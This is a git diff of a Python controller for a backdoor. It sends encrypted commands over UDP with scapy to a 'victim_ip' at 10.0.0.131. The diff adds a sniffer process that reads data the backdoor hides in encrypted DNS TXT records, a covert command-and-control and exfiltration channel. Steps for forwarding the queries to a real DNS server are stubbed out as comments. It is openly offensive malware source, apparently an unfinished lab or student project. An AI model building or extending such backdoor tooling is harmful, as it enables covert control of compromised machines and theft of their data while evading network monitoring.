@@ -1,11 +1,41 @@
 # This will contain the code for sending packets and receiving responses to the backdoor.
 
 from shell import *
-from scapy.all import DNS, DNSQR, IP, sr1, UDP, send, sniff, DNSRR, DNSTextField, Raw, RawVal
+from scapy.all import IP, sr1, UDP, send, sniff, Raw
 from encryption import *
-from multiprocessing import Process
+from multiprocessing import Process, SimpleQueue
 
-def send_udp(victim_ip: str, data: str, encryption_handler: StreamEncryption):
+queue = SimpleQueue()
+
+# Initialize the encryption context.
+encryption_handler = StreamEncryption()
+encryption_handler.read_nonce("nonce.bin")
+encryption_handler.read_secret("secret.key")
+encryption_handler.initialize_encryption_context()
+
+def subprocess_packet_handler(pkt):
+    if pkt[UDP].sport != 53 or pkt[UDP].dport != 53:
+        return None
+    # 1. Decrypt the data in the TXT record.
+    print(pkt.show())
+    encrypted_message = pkt[UDP].an.rdata[0]
+    message = encryption_handler.decrypt(encrypted_message)
+    print(f"Received: {message.decode('utf-8')}")
+    # 2. Put the data in the queue.
+
+    # 3. Remove the TXT record from the pkt.
+
+    # 4. sr1 the DNS query to a legit DNS server.
+
+    # 5. send the response back to the backdoor machine.
+
+    # 6. Finish.
+
+def subprocess_start():
+    sniff(filter="ip src host 10.0.0.131 and not port ssh and udp and not icmp", iface="enp2s0", prn=subprocess_packet_handler)
+
+
+def send_udp(victim_ip: str, data: str):
     """
         Sends a UDP packet to the backdoor which is supposed to contain a command. 
         All commands get sent to a specific UDP port on the backdoor machine. 
@@ -23,18 +53,15 @@ def send_udp(victim_ip: str, data: str, encryption_handler: StreamEncryption):
     # Send the packet.
     send(pkt)
 
+
 if __name__ == "__main__":
 
-    # Initialize the encryption context.
-    encryption_handler = StreamEncryption()
-    encryption_handler.read_nonce("nonce.bin")
-    encryption_handler.read_secret("secret.key")
-    encryption_handler.initialize_encryption_context()
 
     # Start the secondary process which sniffs for DNS requests from the backdoor,
     # decodes the attached information, and forwards the DNS request to a legitimate server,
     # then forwards the legitmate response back to the backdoor.
-
+    decode_process = Process(target=subprocess_start)
+    decode_process.start()
 
     # Main shell loop
     print_menu()
@@ -57,10 +84,11 @@ if __name__ == "__main__":
                 file_path = args[1]
                 data = args[0] + " " + args[1]
                 # Send the command to backdoor.
-                send_udp("10.0.0.131", data, encryption_handler)
+                send_udp("10.0.0.131", data)
                 # Receive the response.
+
                 # Now we need a way of checking for the response.
                 # Each response will be packaged as follows:
                 # responseID data
                 pass
-
+    decode_process.kill()
